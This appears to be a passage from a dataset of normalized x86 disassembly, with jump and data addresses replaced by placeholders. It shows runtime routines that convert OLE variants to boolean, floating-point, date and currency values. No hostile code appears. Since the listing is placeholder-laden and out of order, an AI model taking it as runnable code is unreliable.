cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fild [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410ae0
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410c98
mov [ esp ] al
jmp r-xdata
mov eax ebx
call sub_410ba8
mov [ esp ] al
jmp r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov eax ebx
call sub_410be8
mov [ esp ] al
jmp r-xdata
jmp r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov dx 0xb
mov ax 0x1
call sub_40e9e8
setne al
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_410c4c
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_410ba8
mov [ esp ] al
mov eax ebx
call sub_410ba8
mov [ esp ] al
jmp r-xdata
jmp [ eax * 4 + jump_table_410e74 ]
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410ae0
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410c98
mov [ esp ] al
jmp r-xdata
setne al
mov [ esp ] al
jmp r-xdata
cmp [ eax ] 0x0
sub_410fec
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4110a1
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412c60
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404204
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_4097fc
test al al
je r-xdata
sub edx 0x7ffdfffb
jne r-xdata
mov dx [ ebx ]
mov cx 0x5
mov eax 0x80020005
call sub_40ee7c
jmp r-xdata
fld [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov dx [ ebx ]
mov cx 0x5
call sub_40ee7c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4110a8
lea eax [ ebp - 0x1c ]
call sub_403f7c
lea eax [ ebp - 0xc ]
call sub_40465c
retn
sub_4110b0
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x5
call sub_40ee7c
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_4110fc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411151
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f548
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_4111ac
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411158
lea eax [ ebp - 0x18 ]
call sub_40f220
retn
sub_411160
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414940
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x5
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_4111ac
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4111c8 ]
mov eax ebx
call sub_410fec
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_410fec
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4111ac
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4110b0
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_4110fc
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x5
mov ax 0x1
call sub_40e9e8
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411160
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_4110b0
fstp [ esp ]
fwait
mov eax ebx
call sub_4110b0
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4113a5 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_410fec
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4111ac
fstp [ esp ]
fwait
jmp r-xdata
sub_411544
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x14
ja r-xdata
xor eax eax
push ebp
push sub_4116a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4111ac
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_411566 ]
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x14 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x4
mov ax 0x1
call sub_40e9e8
sub_4116d4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4117b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412c60
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404204
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_40b204
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4117b7
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_403fa0
lea eax [ ebp - 0xc ]
call sub_40465c
retn
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_404204
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
call sub_409818
test al al
je r-xdata
mov dx [ ebx ]
mov cx 0x7
call sub_40ee7c
jmp r-xdata
mov dx [ ebx ]
mov cx 0x7
mov eax 0x80020005
call sub_40ee7c
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_4117c0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x7
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40ee7c
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411820
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x7
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40ee7c
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_41186c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4118c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f548
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_41191c
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4118c8
lea eax [ ebp - 0x18 ]
call sub_40f220
retn
sub_4118d0
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414940
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x7
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_41191c
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411938 ]
mov eax ebx
call sub_4116d4
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411820
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_4116d4
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_4117c0
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_41191c
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411820
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_41186c
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x7
mov ax 0x1
call sub_40e9e8
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_4118d0
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411820
fstp [ esp ]
fwait
mov eax ebx
call sub_411820
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_411b03 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411820
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_4116d4
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_4117c0
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_41191c
fstp [ esp ]
fwait
jmp r-xdata
sub_411c6c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411d18
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412c60
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_404204
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
call sub_409870
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411d1f
lea eax [ ebp - 0x10 ]
call sub_403f7c
lea eax [ ebp - 0xc ]
call sub_40465c
retn
mov dx [ ebx ]
mov cx 0x6
mov eax 0x80020005
call sub_40ee7c
jmp r-xdata
mov dx [ ebx ]
mov cx 0x6
call sub_40ee7c
jmp r-xdata
sub_411d28
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x6
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40ee7c
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411d88
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x6
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40ee7c
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fild [ esp ]
add esp 0x18
pop ebx
retn
sub_411dd4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411e29
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f548
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411e84
fistp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411e30
lea eax [ ebp - 0x18 ]
call sub_40f220
retn
sub_411e38
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414940
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x6
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411e84
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411ea0 ]
mov eax ebx
call sub_411c6c
fistp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411d88
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_411d88
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411c6c
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411d28
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411e84
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411d88
fistp [ esp ]
fwait
jmp r-xdata
fild [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411dd4
fistp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x6
mov ax 0x1
call sub_40e9e8
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411e38
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411d88
fistp [ esp ]
fwait
mov eax ebx
call sub_411d88
fistp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4120a5 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411d88
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_411d88
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411c6c
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
